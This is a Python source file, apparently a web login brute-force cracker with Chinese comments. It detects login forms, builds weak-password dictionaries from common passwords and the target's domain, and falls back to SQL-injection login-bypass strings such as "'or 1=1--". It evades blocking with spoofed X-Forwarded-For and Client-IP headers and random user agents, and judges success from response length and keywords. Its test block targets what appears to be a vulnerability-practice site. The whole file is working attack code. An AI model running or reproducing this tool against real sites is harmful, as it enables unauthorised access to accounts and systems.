import time, requests, os, sys, re
import random, urllib
import datetime,itertools
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from bs4 import BeautifulSoup as BS
import json
from string import whitespace

log_file = 'web_crack_log.txt'
oklog_file = 'web_crack_ok.txt'

exp_user_dic = ["admin' or 'a'='a", "'or'='or'", "admin' or '1'='1' or 1=1", "')or('a'='a", "'or 1=1--"]
exp_pass_dic = exp_user_dic

with open('cms.json','r',encoding="utf-8") as config:
    data=config.read()
    cms=json.loads(data)
    kind_num=len(cms)

def mix_dic(url):
    mix_user_dic = ['admin']
    mix_pass_dic = []
    static_pass_dic = ['{user}', '123456', '{user}888', '12345678', '123123',  '88888888','888888',
                       '{user}123', '{user}123456', '{user}666', '123456789', '654321', '666666','66666666',
                       '1234567890', '8888888', '987654321','0123456789', '12345', '1234567']
    mix_pass_dic = gen_dynam_dic(url)
    static_pass_dic.extend(mix_pass_dic)    #常用密码 + 与网站域名相关的密码
    return mix_user_dic, static_pass_dic

def gen_dynam_dic(url):
    dynam_pass_dic = []
    tmp_dic = []
    suffix_dic = ['', '123', '888', '666', '123456']
    list1 = url.split('/')
    host = list1[2].split(":")[0]
    compile_ip = re.compile('^(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)$')
    if compile_ip.match(host):
        check_ip = 1
    else:
        check_ip = 0
    if not check_ip:
        #当前是域名而不是IP地址
        list2 = host.split(".")
        #域名的各个部分
        i = len(list2)
        for u in range(i):  # 生成url字典1
            list3 = list2[u:]
            #从u开始到结束
            part = '.'.join(list3)
            if (len(part) < 5):
                continue
            dynam_pass_dic.append(part)
        for u in range(i):  # 生成url字典2
            list3 = list2[u]
            if len(list3) < 5:
                continue
            tmp_dic.append(list3)
        for i in tmp_dic:
            for suffix in suffix_dic:
                u = i + suffix
                dynam_pass_dic.append(u)
        return dynam_pass_dic
    else: #传入的参数是IP地址而不是域名
        return ''
    #例如 输入URL是http://www.baidu.com
    #host 是www.baidu.com
    #list2是 www、baidu、com
    #part是 www.baidu.com、baidu.com、com
    #最后生成密码列表如 www.baidu.com; baidu.com; baidu123456等等

def requests_proxies():
    proxies = {
        # 'http':'127.0.0.1:8080',
        # 'https':'127.0.0.1:8080'
    }
    return proxies


def random_headers():#生成随机headers
    user_agent = ['Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre',
                  'Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60',
                  'Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14',
                  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5']
    UA = random.choice(user_agent)
    a = str(random.randint(1, 255))
    b = str(random.randint(1, 255))
    c = str(random.randint(1, 255))
    random_XFF = '127.' + a + '.' + b + '.' + c
    random_CI= '127.' + c + '.' + a + '.' + b
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': UA,
        'X-Forwarded-For': random_XFF,
        'Client-IP':random_CI,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        "Referer": "http://www.baidu.com/",
        'Content-Type': 'application/x-www-form-urlencoded'}
    return headers


def recheck(path, data, user_name, pass_word): #本函数用于检测出疑似正确用户密码时的复检
    data1 = data
    conn = requests.session()
    pass_word = str(pass_word.replace('{user}', user_name)) #将密码序列中的这个user改成user_name

    data_test = str(data1.replace('%7Buser_name%7D', user_name)) #还是 {user_name}
    data_test = str(data_test.replace('%7Bpass_word%7D', 'length_test')) #{pass_word} 改成 length_test
    #这一组是必然错误的密码

    data2 = str(data1.replace('%7Buser_name%7D', user_name))
    data2 = str(data2.replace('%7Bpass_word%7D', pass_word)) #这一组是测试用的密码

    res_01 = conn.post(url=path, data=data_test, headers=random_headers(), timeout=10, verify=False,
                       allow_redirects=False, proxies=requests_proxies())
    #使用必然错误的密码发送请求，禁用重定向，忽略SSL验证
    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
                       allow_redirects=False, proxies=requests_proxies()) #测试密码发送请求
    res_01.encoding = res_01.apparent_encoding
    res_02.encoding = res_02.apparent_encoding #指定编码等于原始页面编码
    error_length_01 = len(res_01.text+str(res_01.headers))
    error_length_02 = len(res_02.text+str(res_02.headers))

    if error_length_01 == error_length_02: #疑似正确密码和错误密码返回相同
        return 0
    else:
        return 1


def get_post_path(content, url):
    form_action = str(content).split('\n')[0] #content第一行的数据
    soup = BS(form_action, "lxml")
    url_path = ''
    for i in re.findall(".*?/", url):
        url_path = url_path + i
    #得到纯净的url，不含问号等
    #例如 URL = "http://www.baidu.com/?k=1&b=2"
    #url_path = http://www.baidu.com

    action_url = soup.form['action'] #由此可见，form_action是标签 <form action = "...">，进入BS得到了一个易于操作的对象
    if str(action_url).startswith('http'):
        path = action_url
    else:
        path = url_path + '/' + soup.form['action'] #主体URL + 表单中的相对路径
    return path #得到了发送请求的路径


def get_form(url):
    url1 = url.strip()
    header = random_headers()
    res = requests.get(url1, timeout=10, verify=False, headers=header)
    res.encoding = res.apparent_encoding
    html = res.text
    cms_id =get_cms_kind(html) #获取内容管理系统的型号
    all_soup = BS(html, "lxml")
    captchas = ['验证码', '验 证 码','点击更换', '点击刷新','看不清','认证码','安全问题']
    if cms_id  and  cms[cms_id]['captcha'] == 1: #识别到CMS型号（但是我看JSON文件里面并没有哪个CMS的captcha是1）
        print("[-] captcha in login page: " + url + '\n',time.strftime('%Y-%m-%d %X', time.localtime(time.time())))
        with open(log_file, 'a+') as log:
            log.write("[-] captcha in login page: "  + url + '\n')
        return '','',''
    else:
        if not cms_id :
            for forms in all_soup.find_all('form'):
                captchas = ['验证码', '验 证 码','点击更换', '点击刷新','看不清','认证码','安全问题']
                for captcha in captchas:
                     if captcha in forms:
                         print("[-]" + captcha + " in page: " + url + '\n')
                         return '',''
    #总而言之，有验证码就结束爆破
    try:
        title = all_soup.title.text
    except:
        title = ''
    result = re.findall(".*<form (.*)</form>.*", html, re.S)
    #得到form标签往下所有的内容
    #如 <form id="...">
    #就从id=开始
    form_data = ''
    form_content = ''
    if result:
        form_data = '<form ' + result[0] + ' </form>' #整个表单部分的代码

        form_soup = BS(form_data, "lxml")

        form_content = form_soup.form #表单去除了标签

    return form_content, title,cms_id


def get_data(url, content):
    data = {}
    captcha = 0
    user_key = ''
    pass_key = ''
    for x in content.find_all('input'): #对于所有input框
        ok_flag = 0
        if x.has_attr('name'):
            parameter = x['name']
        elif x.has_attr('id'):
            parameter = x['id']
        else:
            parameter = ''
        if x.has_attr('value'):
            value = x['value']
        else:
            value = '0000'
        if parameter: #input含有 name/id 属性
            if not user_key:
                for z in [ 'user', 'name','zhanghao', 'yonghu', 'email', 'account', 'username']:
                    if z in parameter.lower(): #content的 name/id 属性内容表示这是一个用于输入用户名的input框
                        value = '{user_name}'
                        user_key = parameter
                        ok_flag = 1
                        break
            if not ok_flag:
                for y in ['pass', 'pw', 'mima', 'password']:
                    if y in parameter.lower():
                        value = '{pass_word}'
                        pass_key = parameter
                        ok_flag = 1
                        break
            data[parameter] = str(value) #字典中 parameter 值为 value 可能是 {user_name} 或者 {pass_word} 或者0000

    for i in ['reset']: #i = reset
        for r in list(data.keys()): #对于data中的所有键
            if i in r.lower():
                data.pop(r) #此函数用于清除 value = 0000 的可能性

    else:
        return user_key,pass_key,str(urllib.parse.urlencode(data))


def get_error_length(conn, path, data):
    data1 = data
    cookie_error_flag = 0
    dynamic_req_len = 0
    data2 = str(data1.replace('%7Buser_name%7D', 'admin'))
    data2 = str(data2.replace('%7Bpass_word%7D', 'length_test'))
    res_test = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
                       allow_redirects=True, proxies=requests_proxies())#先请求一次
    #本次请求是没有用的，有的网站在第一次访问的时候会在响应头加标记
    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
                       allow_redirects=True, proxies=requests_proxies())
    res_02.encoding = res_02.apparent_encoding
    res = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False, allow_redirects=True,
                    proxies=requests_proxies())
    res.encoding = res.apparent_encoding
    error_length_02 = len(res_02.text+str(res_02.headers))
    error_length = len(res.text+str(res.headers))
    if error_length_02 != error_length:
        dynamic_req_len = 1 #第二第三次请求内容仍然不相等
    if 'Set-Cookie' in res.headers:
        cookie_error_flag = 1
    return error_length, cookie_error_flag, dynamic_req_len


def confirm_login_page(url):
    form_content, title,cms_id = get_form(url)   #title暂时没用
    search_flag = ['检索', '搜', 'search', '查找', 'keyword', '关键字']
    for i in search_flag:
        if i in form_content:
            print("[-] Maybe search pages:", url)
            with open(log_file, 'a+') as log:
                log.write("[-] Maybe search pages:" +url+ '\n')
            form_content = ''
    #以上循环判断这个表单是不是用于搜索的

    logins = ['用户名', '密码', 'login', 'denglu', '登录', 'user', 'pass', 'yonghu', 'mima', 'password'] #此处改过，加了一个password
    login_flag = 0
    if form_content:
        for login in logins:
            if login in str(form_content):
                login_flag = 1
                break
        if login_flag == 0:
            print("[-] Mayme not login pages:", url)
            with open(log_file, 'a+') as log:
                log.write("[-] Mayme not login pages:"+url+ '\n')
            form_content = ''
    return form_content,cms_id

def get_cms_kind(html):

    for cms_id in range(kind_num):
        keyword = cms[cms_id]['keywords']
        if keyword and keyword in html:
            print("识别到cms:",cms[cms_id]['name'])
            if cms[cms_id]['alert']:
                print(cms[cms_id]['note'])
            return cms_id
    #print("未识别出当前所使用cms")
    return 0

def web_crack_task(url):
    print("WEAK_PASSWORD CHECKING..." + url)
    try:
        form_content,cms_id = confirm_login_page(url) #确认当前页面是登录页面，否则form_content置空
        if cms_id :
            exp_able=cms[cms_id]['exp_able']
        else:
            exp_able=1
        if form_content:
            user_key,pass_key,data = get_data(url, form_content) #获取表单中用户名和密码的name
            if data:
                print("Checking :", url,time.strftime('%Y-%m-%d %X', time.localtime(time.time())))
                path= get_post_path(form_content, url) #获取表单提交地址
                user_dic, pass_dic = mix_dic(url) #生成字典
                user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)
                recheck_flag = 1
                if user_name:
                    print("Rechecking...", url,user_name, pass_word)
                    recheck_flag = recheck( path, data, user_name, pass_word)
                else:
                    if exp_able:
                        user_dic=exp_user_dic
                        pass_dic=exp_pass_dic
                        print('Exp_dic is trying')
                        user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)
                        if user_name:
                            print("Rechecking......",url, user_name, pass_word)
                            recheck_flag = recheck(path, data, user_name, pass_word) #复检成功返回1
                        else:
                            recheck_flag = 0
                    else:
                            recheck_flag = 0

                if recheck_flag:
                    print("[+] Success url:", url, " user/pass", user_name+ '/' + pass_word)
                    return 1, user_name, pass_word
                else:
                    print("[-] Faild url:", url,time.strftime('%Y-%m-%d %X', time.localtime(time.time())))
                    with open(log_file, 'a+') as log:
                        log.write("[-] Faild url:"+url+ '\n')
                        return -1, '', ''
        else:
            return -3, '', ''
    except Exception as e:
        start = datetime.datetime.now()
        with open('web_crack_error.txt', 'a+') as error_log:
            error_log.write(str(start) + str(e) + '\n')
        print(start, e)
        return -2, '', ''


def crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id):
    try:
        conn = requests.session()
        error_length, cookie_error_flag, dynamic_req_len = get_error_length(conn, path, data)
        if dynamic_req_len: #网页返回的长度是动态的
            return False, False
        num = 0
        success_flag = 0
        dic_all = len(user_dic) * len(pass_dic) #总组合数
        if not dic_all: #其中一方是0
            return False, False
        fail_words = ['密码错误', '重试', '不正确', '密码有误','不成功', '重新输入', 'history.back', '不存在', '登录失败', '登陆失败','出错',
                        '已被锁定','history.go','安全拦截','还可以尝试','无效','攻击行为','创宇盾',
                        '非法','百度云加速','安全威胁','防火墙','黑客', '不合法','warning.asp?msg=','Denied']
        success_words = ['success', '成功', '已登录', '通过']
        for user_name in user_dic:
            for pass_word in pass_dic:
                right_pass = 1
                data1 = data    #data字典所对应的格式是 name:{user_name} 或 name: {pass_word}
                pass_word = pass_word.replace('{user}', user_name) #把password字典中的{user}换成用户名
                data2 = data1.replace('%7Buser_name%7D', urllib.parse.quote(user_name))
                data2 = data2.replace('%7Bpass_word%7D', urllib.parse.quote(pass_word)) #把data字典中标记的换成现有的弱口令字典
                num = num + 1
                #print('URL: ',path,"字典总数：", dic_all, " 当前尝试：", num, " checking:", user_name, pass_word)
                print("字典总数：", dic_all, " 当前尝试：", num, " checking:", user_name, pass_word)
                res = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
                                allow_redirects=True, proxies=requests_proxies())
                res.encoding = res.apparent_encoding
                html=res.text+str(res.headers)
                #res——使用当前用户名密码之后的返回结果
                if cms_id and cms[cms_id]['success_flag']:      #有cms并且返回页面中含有成功标记
                    if  cms[cms_id]['success_flag'] in html:
                        success_flag = 1
                        return user_name, pass_word #疑似成功
                elif cms_id and cms[cms_id]['fail_flag'] :
                    if cms[cms_id]['fail_flag'] in html:    #此项一般是空，但是填写之后遇到此项会退出爆破
                        return False, False
                    else:
                        continue
                else:
                    for i in fail_words:        #没有CMS，只能判断返回页面中是否有失败符号
                        if i in html:
                            right_pass = 0
                            break
                    for i in success_words:
                        if i in html:
                            success_flag = 1
                            return user_name, pass_word

                    if right_pass:
                        cur_length = len(res.text + str(res.headers))
                        if user_key:
                            if user_key in res.text:    #返回结果中还有这个字段，看来本次组合是失败的
                                continue
                            elif pass_key:
                                if pass_key in res.text:
                                    continue
                        if cur_length != error_length:
                            success_flag = 1
                            return user_name, pass_word
                    else:
                        continue
        if success_flag == 0:
            return False, False
    except Exception as e:
        start = datetime.datetime.now()
        with open('web_crack_error.txt', 'a+') as error_log:
            error_log.write(str(start) + str(e) + '\n')
        print(start, e)

if __name__ == "__main__":
    #status, uname, pw = web_crack_task('https://www.bihuoedu.com/vul/burteforce/bf_token.php')
    #print(status, uname, pw)
    #规定返回值：1代表成功、-1代表失败、-2代表异常、-3代表当前界面没有表单。
    s = requests.session()
    res = s.get('https://www.bihuoedu.com/vul/burteforce/bf_token.php')
    res.encoding = res.apparent_encoding
    soup = BS(res.text, 'lxml')
    for x in soup.find_all('input'):
        if x.has_attr('name') and x['name'] == 'token':
            token_val = x['value']
    data = {}
    data['username'] = 'admin'
    data['password'] = '123456'
    data['token'] = token_val
    data['submit'] = '登录'
    print(token_val)
    res2 = s.post('https://www.bihuoedu.com/vul/burteforce/bf_token.php', data)
    res2.encoding = res2.apparent_encoding
    print(res2.text)